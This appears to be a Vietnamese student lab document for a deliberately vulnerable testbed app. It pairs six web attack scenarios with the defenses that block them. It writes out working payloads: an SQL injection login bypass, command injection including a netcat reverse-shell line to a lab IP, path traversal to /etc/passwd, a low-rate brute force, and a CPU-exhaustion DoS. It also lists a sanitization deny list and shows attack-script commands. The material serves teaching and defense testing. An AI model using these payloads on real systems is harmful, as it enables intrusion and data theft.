# Kịch Bản Tấn Công Tầng Ứng Dụng (L7) & Vượt Tường Lửa Mạng (W4-T3)

> **Phụ trách:** Hoàng Trung (TV3) — *Target App & L7 Defense Testbed*  
> **Dự án:** PBL4 — Hệ thống Mô phỏng & Giám sát Tấn công Mạng & Hệ điều hành (God-View)  
> **Tài liệu tham chiếu:** [docs/plan.pdf](../plan.pdf) (Task W4-T3, W5-T3)  
> **Công cụ thực thi độc lập:** `scripts/attack-l7.mjs` và `scripts/attack-l7.sh`

---

## 1. Tổng quan bộ công cụ tấn công L7 CLI

Công cụ `scripts/attack-l7.mjs` là bộ điều khiển dòng lệnh độc lập cho phép kiểm chứng và trình diễn **6 kịch bản tấn công Tầng Ứng dụng (Layer 7)** và kỹ thuật **vượt tường lửa mạng (Firewall Bypass)** vào `Target Server (ElectroShop)`.

Công cụ hỗ trợ chế độ so sánh 2 vòng (**Compare Mode**): thực thi đòn đánh khi Khiên L3 TẮT (VULNERABLE) và khi Khiên L3 BẬT (SECURED) để đối chiếu hiệu quả của cơ chế **Phòng thủ Chiều sâu (Defense-in-Depth)**.

---

## 2. Chi tiết 6 Kịch bản Tấn công Tầng Ứng dụng

### 2.1. Kịch bản 1: SQL Injection (Bypass Đăng nhập)
* **Mục tiêu:** `POST /api/auth/login`
* **Payload:**
  ```json
  {
    "username": "admin' --",
    "password": "random_password"
  }
  ```
* **Cơ chế khi Khiên L3 TẮT (`anti_sqli: false`):**
  - Backend sử dụng nối chuỗi SQL thô (`rawQuery`). Ký tự `' --` đóng chuỗi và biến điều kiện mật khẩu thành chú thích (comment).
  - Kẻ tấn công nhận mã `HTTP 200 OK`, chiếm được tài khoản quản trị viên `admin` và JWT token 30 ngày mà không cần mật khẩu.
* **Cơ chế khi Khiên L3 BẬT (`anti_sqli: true`):**
  - Backend kích hoạt **Prepared Statement** (`SELECT ... WHERE username = ? AND password = ?`).
  - Toàn bộ chuỗi payload được coi là giá trị văn bản thuần (string literal). Kẻ tấn công bị từ chối với mã `HTTP 401 Unauthorized`.

---

### 2.2. Kịch bản 2: OS Command Injection (Mở đường cho Reverse Shell)
* **Mục tiêu:** `GET /api/system/network-ping?host=127.0.0.1; id`
* **Payload mẫu:**
  - `127.0.0.1; id`
  - `127.0.0.1; whoami`
  - `127.0.0.1 && nc -e /bin/sh 172.30.44.66 4444` (Mở kết nối Reverse Shell sang máy Hacker)
* **Cơ chế khi Khiên L3 TẮT (`input_sanitization: false`):**
  - Tham số `host` được nối trực tiếp vào hàm `child_process.exec("ping -c 1 " + host)`.
  - Ký tự phân tách lệnh `;` hoặc `&&` kích hoạt thực thi lệnh thứ hai với quyền của tiến trình máy chủ web. Trả về `HTTP 200 OK` kèm kết quả thực thi lệnh shell nhân Linux (`uid=1000...`).
* **Cơ chế khi Khiên L3 BẬT (`input_sanitization: true`):**
  - Bộ lọc Input Sanitization kiểm tra danh sách ký tự nguy hiểm: `[';', '|', '&', '`', '$', '(', ')', '>', '<', '\n']`.
  - Phát hiện ký tự bất hợp pháp $\rightarrow$ Ném ngoại lệ `HTTP 400 Bad Request` kèm cờ `shield: 'L3_COMMAND_INJECTION_BLOCKED'`.

---

### 2.3. Kịch bản 3: Path Traversal (Leo thang thư mục)
* **Mục tiêu:** `GET /api/files/download?name=../../package.json` (hoặc `../../../../etc/passwd`)
* **Cơ chế khi Khiên L3 TẮT (`input_sanitization: false`):**
  - Ứng dụng nối trực tiếp chuỗi vào `path.resolve(publicDir, filename)`.
  - Chuỗi `../` đưa con trỏ file vượt ra khỏi thư mục `/public` được phép và đọc các file cấu hình nhạy cảm của dự án/hệ điều hành. Trả về `HTTP 200 OK` kèm nội dung file.
* **Cơ chế khi Khiên L3 BẬT (`input_sanitization: true`):**
  - Bộ lọc kiểm tra các mẫu điều hướng `..`, `/`, `\`.
  - Chặn đứng yêu cầu với mã `HTTP 400 Bad Request` kèm cờ `shield: 'L3_INPUT_SANITIZATION_ACTIVE'`.

---

### 2.4. Kịch bản 4: Rò rỉ tài liệu mật & Chiếm Flag (Confidential Data Exfiltration)
* **Mục tiêu:** `GET /api/documents/5/download` (Bản vẽ phần cứng R&D mật: `rd-confidential-hardware-blueprint.pdf`)
* **Cơ chế khi Khiên L3 TẮT:**
  - Ứng dụng bỏ qua chính sách kiểm tra cờ bảo mật `is_confidential = 1`.
  - Tải thành công file mật `HTTP 200 OK`, trích xuất được chuỗi cờ an ninh:  
    `FLAG{PBL4_PATH_TRAVERSAL_AND_CONFIDENTIAL_DOC_LEAKED}`.
* **Cơ chế khi Khiên L3 BẬT:**
  - Chính sách phân quyền tài liệu kiểm tra cờ bảo mật. Yêu cầu bị từ chối với mã `HTTP 403 Forbidden` kèm cờ `shield: 'L3_CONFIDENTIAL_POLICY_ACTIVE'`.

---

### 2.5. Kịch bản 5: Heavy Endpoint DoS (Vắt kiệt CPU qua băm SHA-256)
* **Mục tiêu:** `GET /api/reports/analytics?iterations=150000`
* **Cơ chế tấn công:**
  - Gửi hàng loạt request yêu cầu máy chủ thực hiện 150,000 vòng băm SHA-256 mật mã liên tiếp.
  - Mỗi request làm tốn từ 100ms - 300ms thời gian CPU trên Node.js Event Loop.
* **Cơ chế phòng thủ (Dynamic Rate Limiting):**
  - Khi cờ `rate_limit` BẬT: `DynamicRateLimitGuard` áp dụng thuật toán **Cửa sổ trượt (Sliding Window Log)** lưu trữ timestamp theo IP.
  - Khi một IP gửi quá 10 request trong vòng 5 giây, các request tiếp theo lập tức bị chặn bằng mã `HTTP 429 Too Many Requests` (`L3_RATE_LIMIT_ACTIVE`), bảo vệ máy chủ không bị nghẽn CPU.

---

### 2.6. Kịch bản 6: Low-Rate Brute Force (Vượt Tường Lửa Mạng L1)
* **Mục tiêu:** `POST /api/auth/login` (Tài khoản `engineer_user` với từ điển mật khẩu)
* **Nguyên lý học thuật:**
  - **Tường lửa Tầng Mạng (L1 `iptables` rate-limit):** Được cấu hình để chặn các luồng bão gói tin thể tích lớn (Volumetric Attacks) vượt ngưỡng 50 gói tin/giây.
  - **Kỹ thuật vượt tường lửa (Firewall Bypass):** Attacker gửi các lượt đoán mật khẩu với tần suất chậm rãi (~1 request/giây). Tường lửa mạng L1 hoàn toàn **không kích hoạt** vì lưu lượng nằm sâu dưới ngưỡng phát hiện.
  - **Vai trò của Khiên L3:** Chỉ có cơ chế kiểm soát tần suất tầng ứng dụng (Dynamic Rate Limiting & Account Lockout) mới có thể tương quan các lần thử đăng nhập thất bại và khóa IP tạm thời bằng mã `HTTP 429`.

---

## 3. Hướng dẫn chạy thực nghiệm

### 3.1. Chạy nhanh qua Node.js hoặc Bash
```bash
# 1. Chạy toàn bộ 6 kịch bản tấn công
node scripts/attack-l7.mjs --all

# 2. Hoặc chạy qua Bash wrapper
./scripts/attack-l7.sh --all

# 3. Chế độ diễn tập SO SÁNH (Tắt khiên -> Khai thác -> Bật khiên -> Chặn đứng)
node scripts/attack-l7.mjs --compare
```

### 3.2. Chạy từng kịch bản đơn lẻ
```bash
# Chỉ test đòn SQL Injection
node scripts/attack-l7.mjs --sqli

# Chỉ test đòn OS Command Injection
node scripts/attack-l7.mjs --cmd

# Chỉ test đòn Path Traversal
node scripts/attack-l7.mjs --traversal

# Chỉ test đòn Rò rỉ tài liệu mật & Lấy Flag
node scripts/attack-l7.mjs --exfil

# Bắn bão Heavy API DoS
node scripts/attack-l7.mjs --dos

# Tấn công dò mật khẩu tần suất thấp lách Firewall
node scripts/attack-l7.mjs --brute
```

### 3.3. Điều khiển Khiên L3 qua dòng lệnh
```bash
# Xem trạng thái các cờ khiên
node scripts/attack-l7.mjs --status

# BẬT toàn bộ khiên
node scripts/attack-l7.mjs --enable

# TẮT toàn bộ khiên
node scripts/attack-l7.mjs --disable

# Đảo cờ cụ thể (ví dụ chỉ đảo cờ anti_sqli)
node scripts/attack-l7.mjs --toggle anti_sqli
```
